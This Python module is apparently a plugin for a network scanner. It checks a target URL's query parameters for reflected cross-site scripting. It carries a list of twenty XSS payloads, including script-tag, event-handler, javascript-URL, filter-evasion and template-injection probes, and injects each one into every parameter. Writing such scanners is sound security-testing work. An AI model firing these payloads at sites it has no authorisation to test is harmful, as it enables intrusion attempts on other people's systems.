import json
from urllib.parse import urlparse, parse_qs, urlencode

try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

SERVICE = "http"
DESCRIPTION = "Taken from TFS(https://github.com/PrathyayPGM-ALT/TFS) with permission. Checks for Cross-Site Scripting (XSS) vulnerabilities in HTTP query parameters."
SCRIPT_NAME = "http-tfs-xss"
OPTIONAL = True

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '${7*7}',
    '{{7*7}}',
    '<details open ontoggle=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '" onmouseover="alert(1)',
    "';alert(1)//",
    '</title><script>alert(1)</script>',
    '\x3cscript\x3ealert(1)\x3c/script\x3e',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    '<a href="javascript:alert(1)">click</a>',
    '<marquee onstart=alert(1)>',
]


def run(target, port, args=None):
    if not REQUESTS_OK:
        print("[!] requests not installed  ->  pip install requests")
        return

    args = args or {}
    url = args.get("url") or f"http://{target}:{port}"
    output = args.get("output")

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        print("[!] No query parameters found")
        return

    session = requests.Session()
    findings = []

    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            encoded = urlencode(test_params)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{encoded}"
            try:
                resp = session.get(test_url, allow_redirects=False)
                if payload in resp.text:
                    print(f"[!] XSS reflected param={param} payload={payload[:50]}")
                    print(f"[*] URL: {test_url[:90]}")
                    findings.append({
                        "type": "XSS",
                        "severity": "HIGH",
                        "param": param,
                        "payload": payload,
                        "url": test_url,
                    })
                    break
            except Exception:
                pass

    print(f"[*] Findings: {len(findings)}")

    if output:
        with open(output, "w") as f:
            json.dump(findings, f, indent=2)
        print(f"[+] Saved -> {output}")
